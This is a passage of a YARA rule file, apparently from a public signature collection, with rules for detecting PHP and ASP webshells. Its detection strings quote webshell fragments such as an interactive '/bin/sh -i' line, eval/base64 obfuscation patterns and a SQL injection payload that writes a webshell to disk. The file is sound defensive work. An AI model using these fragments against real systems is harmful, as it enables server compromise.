		$pbs70 = "{'_'.$_}[\"_\"](${'_'.$_}[\"_" wide ascii
		$pbs71 = "\"e45e329feb5d925b\"" wide ascii
		$pbs72 = "| PHP FILE MANAGER" wide ascii
		$pbs73 = "\neval(htmlspecialchars_decode(gzinflate(base64_decode($" wide ascii
		$pbs74 = "/*\n\nShellindir.org\n\n*/" wide ascii
		$pbs75 = "$shell = 'uname -a; w; id; /bin/sh -i';" wide ascii
		$pbs76 = "'password' . '/' . 'id' . '/' . " wide ascii
		$pbs77 = "= create_function /*" wide ascii
		$pbs78 = "W3LL M!N! SH3LL" wide ascii
		$pbs79 = "extract($_REQUEST)&&@$" wide ascii
		$pbs80 = "\"P-h-p-S-p-y\"" wide ascii
		$pbs81 = "\\x5f\\x72\\x6f\\x74\\x31\\x33" wide ascii
		$pbs82 = "\\x62\\x61\\x73\\x65\\x36\\x34\\x5f" wide ascii
		$pbs83 = "*/base64_decode/*" wide ascii
		$pbs84 = "\n@eval/*" wide ascii
		$pbs85 = "*/eval/*" wide ascii
		$pbs86 = "*/ array /*" wide ascii
		$pbs87 = "2jtffszJe" wide ascii
		$pbs88 = "edocne_46esab" wide ascii
		$pbs89 = "eval($_HEADERS" wide ascii
		$pbs90 = ">Infinity-Sh3ll<" ascii
		$front1 = "<?php eval(" nocase wide ascii
		$php_short = "<?" wide ascii
		$no_xml1 = "<?xml version" nocase wide ascii
		$no_xml2 = "<?xml-stylesheet" nocase wide ascii
		$no_asp1 = "<%@LANGUAGE" nocase wide ascii
		$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
		$no_pdf = "<?xpacket"
		$php_new1 = /<\?=[^?]/ wide ascii
		$php_new2 = "<?php" nocase wide ascii
		$php_new3 = "<script language=\"php" nocase wide ascii
		$dex = { 64 65 ( 78 | 79 ) 0a 30 }
		$pack = { 50 41 43 4b 00 00 00 02 00 }

	condition:
		filesize <1000KB and ((($php_short in (0..100) or $php_short in ( filesize -1000.. filesize )) and not any of ($no_*)) or any of ($php_new*)) and not ( uint16(0)==0x5a4d or $dex at 0 or $pack at 0 or uint16(0)==0x4b50) and ( any of ($pbs*) or $front1 in (0..60))
}
rule SIGNATURE_BASE_WEBSHELL_PHP_Strings_SUSP : FILE {
    meta:
		description = "typical webshell strings, suspicious"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "25f25df5-4398-562b-9383-e01ccb17e8de"
		date = "2021-01-12"
		modified = "2023-07-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L2660-L2746"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "0dd568dbe946b5aa4e1d33eab1decbd71903ea04"
		hash = "dde2bdcde95730510b22ae8d52e4344997cb1e74"
		hash = "499db4d70955f7d40cf5cbaf2ecaf7a2"
		hash = "281b66f62db5caab2a6eb08929575ad95628a690"
		hash = "1ab3ae4d613b120f9681f6aa8933d66fa38e4886"
		logic_hash = "5c3837ab761ee2209fab5fc333b050a56d80addb03b088ae28040c7393429bb3"
		score = 50
		quality = 40
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$sstring1 = "eval(\"?>\"" nocase wide ascii
		$php_short = "<?" wide ascii
		$no_xml1 = "<?xml version" nocase wide ascii
		$no_xml2 = "<?xml-stylesheet" nocase wide ascii
		$no_asp1 = "<%@LANGUAGE" nocase wide ascii
		$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
		$no_pdf = "<?xpacket"
		$php_new1 = /<\?=[^?]/ wide ascii
		$php_new2 = "<?php" nocase wide ascii
		$php_new3 = "<script language=\"php" nocase wide ascii
		$gfp1 = "eval(\"return [$serialised_parameter"
		$gfp2 = "$this->assert(strpos($styles, $"
		$gfp3 = "$module = new $_GET['module']($_GET['scope']);"
		$gfp4 = "$plugin->$_POST['action']($_POST['id']);"
		$gfp5 = "$_POST[partition_by]($_POST["
		$gfp6 = "$object = new $_REQUEST['type']($_REQUEST['id']);"
		$gfp7 = "The above example code can be easily exploited by passing in a string such as"
		$gfp8 = "Smarty_Internal_Debug::start_render($_template);"
		$gfp9 = "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php"
		$gfp10 = "[][}{;|]\\|\\\\[+=]\\|<?=>?"
		$gfp11 = "(eval (getenv \"EPROLOG\")))"
		$gfp12 = "ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9saWNlbnNlLm9wZW5jYXJ0LWFwaS5jb20vbGljZW5zZS5waHA/b3JkZXJ"
		$inp1 = "php://input" wide ascii
		$inp2 = /_GET\s?\[/ wide ascii
		$inp3 = /\(\s?\$_GET\s?\)/ wide ascii
		$inp4 = /_POST\s?\[/ wide ascii
		$inp5 = /\(\s?\$_POST\s?\)/ wide ascii
		$inp6 = /_REQUEST\s?\[/ wide ascii
		$inp7 = /\(\s?\$_REQUEST\s?\)/ wide ascii
		$inp15 = "_SERVER['HTTP_" wide ascii
		$inp16 = "_SERVER[\"HTTP_" wide ascii
		$inp17 = /getenv[\t ]{0,20}\([\t ]{0,20}['"]HTTP_/ wide ascii
		$inp18 = "array_values($_SERVER)" wide ascii
		$inp19 = /file_get_contents\("https?:\/\// wide ascii

	condition:
		filesize <700KB and ((($php_short in (0..100) or $php_short in ( filesize -1000.. filesize )) and not any of ($no_*)) or any of ($php_new*)) and not ( any of ($gfp*)) and (1 of ($sstring*) and ( any of ($inp*)))
}
rule SIGNATURE_BASE_WEBSHELL_PHP_In_Htaccess : FILE {
    meta:
		description = "Use Apache .htaccess to execute php code inside .htaccess"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "0f5edff9-22b2-50c9-ae81-72698ea8e7db"
		date = "2021-01-07"
		modified = "2023-07-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L2748-L2770"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "c026d4512a32d93899d486c6f11d1e13b058a713"
		hash = "d79e9b13a32a9e9f3fa36aa1a4baf444bfd2599a"
		hash = "e1d1091fee6026829e037b2c70c228344955c263"
		hash = "c026d4512a32d93899d486c6f11d1e13b058a713"
		hash = "8c9e65cd3ef093cd9c5b418dc5116845aa6602bc92b9b5991b27344d8b3f7ef2"
		logic_hash = "0652a4cb0cb6c61afece5c2e4cbf2f281714509f0d828047f2e3ccd411602115"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$hta = "AddType application/x-httpd-php .htaccess" wide ascii

	condition:
		filesize <100KB and $hta
}
rule SIGNATURE_BASE_WEBSHELL_PHP_Function_Via_Get : FILE {
    meta:
		description = "Webshell which sends eval/assert via GET"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "5fef1063-2f9f-516e-86f6-cfd98bb05e6e"
		date = "2021-01-09"
		modified = "2023-04-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L2772-L2816"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ce739d65c31b3c7ea94357a38f7bd0dc264da052d4fd93a1eabb257f6e3a97a6"
		hash = "d870e971511ea3e082662f8e6ec22e8a8443ca79"
		hash = "73fa97372b3bb829835270a5e20259163ecc3fdbf73ef2a99cb80709ea4572be"
		logic_hash = "309203db8e7374531d359e3a723418d47bead45034c4a7bd726fb714622dc039"
		score = 75
		quality = 83
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$sr0 = /\$_GET\s?\[.{1,30}\]\(\$_GET\s?\[/ wide ascii
		$sr1 = /\$_POST\s?\[.{1,30}\]\(\$_GET\s?\[/ wide ascii
		$sr2 = /\$_POST\s?\[.{1,30}\]\(\$_POST\s?\[/ wide ascii
		$sr3 = /\$_GET\s?\[.{1,30}\]\(\$_POST\s?\[/ wide ascii
		$sr4 = /\$_REQUEST\s?\[.{1,30}\]\(\$_REQUEST\s?\[/ wide ascii
		$sr5 = /\$_SERVER\s?\[HTTP_.{1,30}\]\(\$_SERVER\s?\[HTTP_/ wide ascii
		$gfp1 = "eval(\"return [$serialised_parameter"
		$gfp2 = "$this->assert(strpos($styles, $"
		$gfp3 = "$module = new $_GET['module']($_GET['scope']);"
		$gfp4 = "$plugin->$_POST['action']($_POST['id']);"
		$gfp5 = "$_POST[partition_by]($_POST["
		$gfp6 = "$object = new $_REQUEST['type']($_REQUEST['id']);"
		$gfp7 = "The above example code can be easily exploited by passing in a string such as"
		$gfp8 = "Smarty_Internal_Debug::start_render($_template);"
		$gfp9 = "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php"
		$gfp10 = "[][}{;|]\\|\\\\[+=]\\|<?=>?"
		$gfp11 = "(eval (getenv \"EPROLOG\")))"
		$gfp12 = "ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9saWNlbnNlLm9wZW5jYXJ0LWFwaS5jb20vbGljZW5zZS5waHA/b3JkZXJ"

	condition:
		filesize <500KB and not ( any of ($gfp*)) and any of ($sr*)
}
rule SIGNATURE_BASE_WEBSHELL_PHP_Writer : FILE {
    meta:
		description = "PHP webshell which only writes an uploaded file to disk"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "05bb3e0c-69b2-5176-a3eb-e6ba2d72a205"
		date = "2021-04-17"
		modified = "2023-07-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L2818-L2908"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ec83d69512aa0cc85584973f5f0850932fb1949fb5fb2b7e6e5bbfb121193637"
		hash = "407c15f94a33232c64ddf45f194917fabcd2e83cf93f38ee82f9720e2635fa64"
		hash = "988b125b6727b94ce9a27ea42edc0ce282c5dfeb"
		hash = "0ce760131787803bbef216d0ee9b5eb062633537"
		hash = "20281d16838f707c86b1ff1428a293ed6aec0e97"
		logic_hash = "34bae0c02156d1c9fd24d674443322409eba0a43e094fc6c05df94bbbe15aa64"
		score = 50
		quality = 42
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$sus3 = "'upload'" wide ascii
		$sus4 = "\"upload\"" wide ascii
		$sus5 = "\"Upload\"" wide ascii
		$sus6 = "gif89" wide ascii
		$sus16 = "Army" fullword wide ascii
		$sus17 = "error_reporting( 0 )" wide ascii
		$sus18 = "' . '" wide ascii
		$php_short = "<?" wide ascii
		$no_xml1 = "<?xml version" nocase wide ascii
		$no_xml2 = "<?xml-stylesheet" nocase wide ascii
		$no_asp1 = "<%@LANGUAGE" nocase wide ascii
		$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
		$no_pdf = "<?xpacket"
		$php_new1 = /<\?=[^?]/ wide ascii
		$php_new2 = "<?php" nocase wide ascii
		$php_new3 = "<script language=\"php" nocase wide ascii
		$inp1 = "php://input" wide ascii
		$inp2 = /_GET\s?\[/ wide ascii
		$inp3 = /\(\s?\$_GET\s?\)/ wide ascii
		$inp4 = /_POST\s?\[/ wide ascii
		$inp5 = /\(\s?\$_POST\s?\)/ wide ascii
		$inp6 = /_REQUEST\s?\[/ wide ascii
		$inp7 = /\(\s?\$_REQUEST\s?\)/ wide ascii
		$inp15 = "_SERVER['HTTP_" wide ascii
		$inp16 = "_SERVER[\"HTTP_" wide ascii
		$inp17 = /getenv[\t ]{0,20}\([\t ]{0,20}['"]HTTP_/ wide ascii
		$inp18 = "array_values($_SERVER)" wide ascii
		$inp19 = /file_get_contents\("https?:\/\// wide ascii
		$php_multi_write1 = "fopen(" wide ascii
		$php_multi_write2 = "fwrite(" wide ascii
		$php_write1 = "move_uploaded_file" fullword wide ascii
		$php_write2 = "copy" fullword wide ascii

	condition:
		((($php_short in (0..100) or $php_short in ( filesize -1000.. filesize )) and not any of ($no_*)) or any of ($php_new*)) and ( any of ($inp*)) and ( any of ($php_write*) or all of ($php_multi_write*)) and ( filesize <400 or ( filesize <4000 and 1 of ($sus*)))
}
rule SIGNATURE_BASE_WEBSHELL_ASP_Writer : FILE {
    meta:
		description = "ASP webshell which only writes an uploaded file to disk"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "a1310e22-f485-5f06-8f1a-4cf9ae8413a1"
		date = "2021-03-07"
		modified = "2023-07-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L2910-L3080"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "df6eaba8d643c49c6f38016531c88332e80af33c"
		hash = "83642a926291a499916e8c915dacadd0d5a8b91f"
		hash = "5417fad68a6f7320d227f558bf64657fe3aa9153"
		hash = "97d9f6c411f54b56056a145654cd00abca2ff871"
		hash = "fc44fd7475ee6c0758ace2b17dd41ed7ea75cc73"
		logic_hash = "7c9f4c9a5005efad02760cf9ba3ea946068ae281cda10215bf8c88f209b582a5"
		score = 60
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$sus1 = "password" fullword wide ascii
		$sus2 = "pwd" fullword wide ascii
		$sus3 = "<asp:TextBox" fullword nocase wide ascii
		$sus4 = "\"upload\"" wide ascii
		$sus5 = "\"Upload\"" wide ascii
		$sus6 = "gif89" wide ascii
		$sus7 = "\"&\"" wide ascii
		$sus8 = "authkey" fullword wide ascii
		$sus9 = "AUTHKEY" fullword wide ascii
		$sus10 = "test.asp" fullword wide ascii
		$sus11 = "cmd.asp" fullword wide ascii
		$sus12 = ".Write(Request." wide ascii
		$sus13 = "<textarea " wide ascii
		$sus14 = "\"unsafe" fullword wide ascii
		$sus15 = "'unsafe" fullword wide ascii
		$sus16 = "Army" fullword wide ascii
		$tagasp_short1 = /<%[^"]/ wide ascii
		$tagasp_short2 = "%>" wide ascii
		$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
		$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
		$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
		$tagasp_long10 = "<%@ " wide ascii
		$tagasp_long11 = /<% \w/ nocase wide ascii
		$tagasp_long12 = "<%ex" nocase wide ascii
		$tagasp_long13 = "<%ev" nocase wide ascii
		$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
		$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
		$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
		$php1 = "<?php"
		$php2 = "<?="
		$jsp1 = "=\"java." wide ascii
		$jsp2 = "=\"javax." wide ascii
		$jsp3 = "java.lang." wide ascii
		$jsp4 = "public" fullword wide ascii
		$jsp5 = "throws" fullword wide ascii
		$jsp6 = "getValue" fullword wide ascii
		$jsp7 = "getBytes" fullword wide ascii
		$perl1 = "PerlScript" fullword
		$asp_input1 = "request" fullword nocase wide ascii
		$asp_input2 = "Page_Load" fullword nocase wide ascii
		$asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
		$asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
		$asp_xml_method1 = "GET" fullword wide ascii
		$asp_xml_method2 = "POST" fullword wide ascii
		$asp_xml_method3 = "HEAD" fullword wide ascii
		$asp_form1 = "<form " wide ascii
		$asp_form2 = "<Form " wide ascii
		$asp_form3 = "<FORM " wide ascii
		$asp_asp = "<asp:" wide ascii
		$asp_text1 = ".text" wide ascii
		$asp_text2 = ".Text" wide ascii
		$asp_always_write1 = /\.write/ nocase wide ascii
		$asp_always_write2 = /\.swrite/ nocase wide ascii
		$asp_write_way_one2 = "SaveToFile" fullword nocase wide ascii
		$asp_write_way_one3 = "CREAtEtExtFiLE" fullword nocase wide ascii
		$asp_cr_write1 = "CreateObject(" nocase wide ascii
		$asp_cr_write2 = "CreateObject (" nocase wide ascii
		$asp_streamwriter1 = "streamwriter" fullword nocase wide ascii
		$asp_streamwriter2 = "filestream" fullword nocase wide ascii

	condition:
		(( any of ($tagasp_long*) or any of ($tagasp_classid*) or ($tagasp_short1 and $tagasp_short2 in ( filesize -100.. filesize )) or ($tagasp_short2 and ($tagasp_short1 in (0..1000) or $tagasp_short1 in ( filesize -1000.. filesize )))) and not (( any of ($perl*) or $php1 at 0 or $php2 at 0) or ((#jsp1+#jsp2+#jsp3)>0 and (#jsp4+#jsp5+#jsp6+#jsp7)>0))) and ( any of ($asp_input*) or ($asp_xml_http and any of ($asp_xml_method*)) or ( any of ($asp_form*) and any of ($asp_text*) and $asp_asp)) and ( any of ($asp_always_write*) and ( any of ($asp_write_way_one*) and any of ($asp_cr_write*)) or ( any of ($asp_streamwriter*))) and ( filesize <400 or ( filesize <6000 and 1 of ($sus*)))
}
rule SIGNATURE_BASE_WEBSHELL_ASP_OBFUSC : FILE {
    meta:
		description = "ASP webshell obfuscated"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "3960b692-9f6f-52c5-b881-6f9e1b3ac555"
		date = "2021-01-12"
		modified = "2023-07-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L3082-L3357"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ad597eee256de51ffb36518cd5f0f4aa0f254f27517d28fb7543ae313b15e112"
		hash = "e0d21fdc16e0010b88d0197ebf619faa4aeca65243f545c18e10859469c1805a"
		hash = "54a5620d4ea42e41beac08d8b1240b642dd6fd7c"
		hash = "fc44fd7475ee6c0758ace2b17dd41ed7ea75cc73"
		hash = "be2fedc38fc0c3d1f925310d5156ccf3d80f1432"
		hash = "3175ee00fc66921ebec2e7ece8aa3296d4275cb5"
		hash = "d6b96d844ac395358ee38d4524105d331af42ede"
		hash = "cafc4ede15270ab3f53f007c66e82627a39f4d0f"
		logic_hash = "96369062f963c3604c05808755fdfca922e5a6da960cb0ee05dee2df72d5d69b"
		score = 75
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$asp_obf1 = "/*-/*-*/" wide ascii
		$asp_obf2 = "u\"+\"n\"+\"s" wide ascii
		$asp_obf3 = "\"e\"+\"v" wide ascii
		$asp_obf4 = "a\"+\"l\"" wide ascii
		$asp_obf5 = "\"+\"(\"+\"" wide ascii
		$asp_obf6 = "q\"+\"u\"" wide ascii
		$asp_obf7 = "\"u\"+\"e" wide ascii
		$asp_obf8 = "/*//*/" wide ascii
		$tagasp_short1 = /<%[^"]/ wide ascii
		$tagasp_short2 = "%>" wide ascii
		$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
		$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
		$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
		$tagasp_long10 = "<%@ " wide ascii
		$tagasp_long11 = /<% \w/ nocase wide ascii
		$tagasp_long12 = "<%ex" nocase wide ascii
		$tagasp_long13 = "<%ev" nocase wide ascii
		$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
		$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
		$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
		$php1 = "<?php"
		$php2 = "<?="
		$jsp1 = "=\"java." wide ascii
		$jsp2 = "=\"javax." wide ascii
		$jsp3 = "java.lang." wide ascii
		$jsp4 = "public" fullword wide ascii
		$jsp5 = "throws" fullword wide ascii
		$jsp6 = "getValue" fullword wide ascii
		$jsp7 = "getBytes" fullword wide ascii
		$perl1 = "PerlScript" fullword
		$asp_payload0 = "eval_r" fullword nocase wide ascii
		$asp_payload1 = /\beval\s/ nocase wide ascii
		$asp_payload2 = /\beval\(/ nocase wide ascii
		$asp_payload3 = /\beval\"\"/ nocase wide ascii
		$asp_payload4 = /:\s{0,10}eval\b/ nocase wide ascii
		$asp_payload8 = /\bexecute\s?\(/ nocase wide ascii
		$asp_payload9 = /\bexecute\s[\w"]/ nocase wide ascii
		$asp_payload11 = "WSCRIPT.SHELL" fullword nocase wide ascii
		$asp_payload13 = "ExecuteGlobal" fullword nocase wide ascii
		$asp_payload14 = "ExecuteStatement" fullword nocase wide ascii
		$asp_payload15 = "ExecuteStatement" fullword nocase wide ascii
		$asp_multi_payload_one1 = "CreateObject" nocase fullword wide ascii
		$asp_multi_payload_one2 = "addcode" fullword wide ascii
		$asp_multi_payload_one3 = /\.run\b/ wide ascii
		$asp_multi_payload_two1 = "CreateInstanceFromVirtualPath" fullword wide ascii
		$asp_multi_payload_two2 = "ProcessRequest" fullword wide ascii
		$asp_multi_payload_two3 = "BuildManager" fullword wide ascii
		$asp_multi_payload_three1 = "System.Diagnostics" wide ascii
		$asp_multi_payload_three2 = "Process" fullword wide ascii
		$asp_multi_payload_three3 = ".Start" wide ascii
		$asp_multi_payload_four1 = "CreateObject" fullword nocase wide ascii
		$asp_multi_payload_four2 = "TransformNode" fullword nocase wide ascii
		$asp_multi_payload_four3 = "loadxml" fullword nocase wide ascii
		$asp_multi_payload_five1 = "ProcessStartInfo" fullword nocase wide ascii
		$asp_multi_payload_five2 = ".Start" nocase wide ascii
		$asp_multi_payload_five3 = ".Filename" nocase wide ascii
		$asp_multi_payload_five4 = ".Arguments" nocase wide ascii
		$asp_always_write1 = /\.write/ nocase wide ascii
		$asp_always_write2 = /\.swrite/ nocase wide ascii
		$asp_write_way_one2 = "SaveToFile" fullword nocase wide ascii
		$asp_write_way_one3 = "CREAtEtExtFiLE" fullword nocase wide ascii
		$asp_cr_write1 = "CreateObject(" nocase wide ascii
		$asp_cr_write2 = "CreateObject (" nocase wide ascii
		$asp_streamwriter1 = "streamwriter" fullword nocase wide ascii
		$asp_streamwriter2 = "filestream" fullword nocase wide ascii
		$o4 = "\\x8" wide ascii
		$o5 = "\\x9" wide ascii
		$o6 = "\\61" wide ascii
		$o7 = "\\44" wide ascii
		$o8 = "\\112" wide ascii
		$o9 = "\\120" wide ascii
		$m_multi_one1 = "Replace(" wide ascii
		$m_multi_one2 = "Len(" wide ascii
		$m_multi_one3 = "Mid(" wide ascii
		$m_multi_one4 = "mid(" wide ascii
		$m_multi_one5 = ".ToString(" wide ascii
		$m_fp1 = "Author: Andre Teixeira - andret@microsoft.com"
		$m_fp2 = "DataBinder.Eval(Container.DataItem" ascii wide
		$oo1 = /\w\"&\"\w/ wide ascii
		$oo2 = "*/\").Replace(\"/*" wide ascii

	condition:
		filesize <100KB and (( any of ($tagasp_long*) or any of ($tagasp_classid*) or ($tagasp_short1 and $tagasp_short2 in ( filesize -100.. filesize )) or ($tagasp_short2 and ($tagasp_short1 in (0..1000) or $tagasp_short1 in ( filesize -1000.. filesize )))) and not (( any of ($perl*) or $php1 at 0 or $php2 at 0) or ((#jsp1+#jsp2+#jsp3)>0 and (#jsp4+#jsp5+#jsp6+#jsp7)>0))) and ((( any of ($asp_payload*) or all of ($asp_multi_payload_one*) or all of ($asp_multi_payload_two*) or all of ($asp_multi_payload_three*) or all of ($asp_multi_payload_four*) or all of ($asp_multi_payload_five*)) or ( any of ($asp_always_write*) and ( any of ($asp_write_way_one*) and any of ($asp_cr_write*)) or ( any of ($asp_streamwriter*)))) and ((( filesize <100KB and ((#o4+#o5+#o6+#o7+#o8+#o9)>20)) or ( filesize <5KB and ((#o4+#o5+#o6+#o7+#o8+#o9)>5 or ((#m_multi_one1+#m_multi_one2+#m_multi_one3+#m_multi_one4+#m_multi_one5)>3))) or ( filesize <700 and ((#o4+#o5+#o6+#o7+#o8+#o9)>3 or (#m_multi_one1+#m_multi_one2+#m_multi_one3+#m_multi_one4+#m_multi_one5)>2))) or any of ($asp_obf*)) or (( filesize <100KB and ((#oo1)>2 or $oo2)) or ( filesize <25KB and ((#oo1)>1)) or ( filesize <1KB and ((#oo1)>0)))) and not any of ($m_fp*)
}
rule SIGNATURE_BASE_WEBSHELL_ASP_Generic_Eval_On_Input : FILE {
    meta:
		description = "Generic ASP webshell which uses any eval/exec function directly on user input"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "0904cefb-6e0f-5e5f-9986-cf83d409ce46"
		date = "2021-01-07"
		modified = "2023-04-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L3359-L3463"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d6b96d844ac395358ee38d4524105d331af42ede"
		hash = "9be2088d5c3bfad9e8dfa2d7d7ba7834030c7407"
		hash = "a1df4cfb978567c4d1c353e988915c25c19a0e4a"
		hash = "069ea990d32fc980939fffdf1aed77384bf7806bc57c0a7faaff33bd1a3447f6"
		logic_hash = "f7b9f43cf2fd6d08b7438f003242e9a19dcea282959c7a1fdff3a35e261a031e"
		score = 75
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$payload_and_input0 = /\beval_r\s{0,20}\(Request\(/ nocase wide ascii
		$payload_and_input1 = /\beval[\s\(]{1,20}request[.\(\[]/ nocase wide ascii
		$payload_and_input2 = /\bexecute[\s\(]{1,20}request\(/ nocase wide ascii
		$payload_and_input4 = /\bExecuteGlobal\s{1,20}request\(/ nocase wide ascii
		$tagasp_short1 = /<%[^"]/ wide ascii
		$tagasp_short2 = "%>" wide ascii
		$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
		$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
		$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
		$tagasp_long10 = "<%@ " wide ascii
		$tagasp_long11 = /<% \w/ nocase wide ascii
		$tagasp_long12 = "<%ex" nocase wide ascii
		$tagasp_long13 = "<%ev" nocase wide ascii
		$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
		$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
		$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
		$php1 = "<?php"
		$php2 = "<?="
		$jsp1 = "=\"java." wide ascii
		$jsp2 = "=\"javax." wide ascii
		$jsp3 = "java.lang." wide ascii
		$jsp4 = "public" fullword wide ascii
		$jsp5 = "throws" fullword wide ascii
		$jsp6 = "getValue" fullword wide ascii
		$jsp7 = "getBytes" fullword wide ascii
		$perl1 = "PerlScript" fullword

	condition:
		( filesize <1100KB and (( any of ($tagasp_long*) or any of ($tagasp_classid*) or ($tagasp_short1 and $tagasp_short2 in ( filesize -100.. filesize )) or ($tagasp_short2 and ($tagasp_short1 in (0..1000) or $tagasp_short1 in ( filesize -1000.. filesize )))) and not (( any of ($perl*) or $php1 at 0 or $php2 at 0) or ((#jsp1+#jsp2+#jsp3)>0 and (#jsp4+#jsp5+#jsp6+#jsp7)>0))) and any of ($payload_and_input*)) or ( filesize <100 and any of ($payload_and_input*))
}
rule SIGNATURE_BASE_WEBSHELL_ASP_Nano : FILE {
    meta:
		description = "Generic ASP webshell which uses any eval/exec function"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "5f2f24c2-159d-51e1-80d9-11eeb77e8760"
		date = "2021-01-13"
		modified = "2023-04-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L3465-L3656"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "3b7910a499c603715b083ddb6f881c1a0a3a924d"
		hash = "990e3f129b8ba409a819705276f8fa845b95dad0"
		hash = "22345e956bce23304f5e8e356c423cee60b0912c"
